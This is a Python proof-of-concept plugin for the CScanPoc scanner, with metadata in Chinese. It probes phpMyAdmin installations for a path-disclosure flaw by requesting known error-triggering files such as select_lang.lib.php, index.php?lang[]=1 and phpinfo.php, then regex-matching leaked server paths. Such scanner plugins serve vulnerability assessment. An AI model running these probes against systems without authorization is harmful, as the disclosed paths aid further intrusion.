# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'PHPMyAdmin_0001'  # 平台漏洞编号，留空
    name = 'PHPMyAdmin 绝对路径获取'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '75cc25cc-9c6a-4391-82c5-8278cf095fcc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            t = (
                "/themes/darkblue_orange/layout.inc.php",
                "/libraries/lect_lang.lib.php",
                "/libraries/mcrypt.lib.php",
                "/libraries/export/xls.php",
                "/libraries/select_lang.lib.php",
                "/index.php?lang[]=1",
                "/darkblue_orange/layout.inc.php",
                "/phpinfo.php",
                "/load_file()",
                "/select_lang.lib.php"
            )
            for s in t:
                hh = hackhttp.hackhttp()
                code, head, res, errcode, _ = hh.http(self.target + s)
                if code == 200:
                    y = re.search('in <b>([^<]+)</b> on line <b>', res)
                    if y:
                        # security_info(y.group(1))
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    m = re.search('</a><h1 class="p">([^<]+)</h1>', res)
                    if m:
                        m2 = re.search(
                            'SCRIPT_FILENAME </td><td class="v">([^<]+)</td></tr>', res)
                        # security_info(m2.group(1))
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
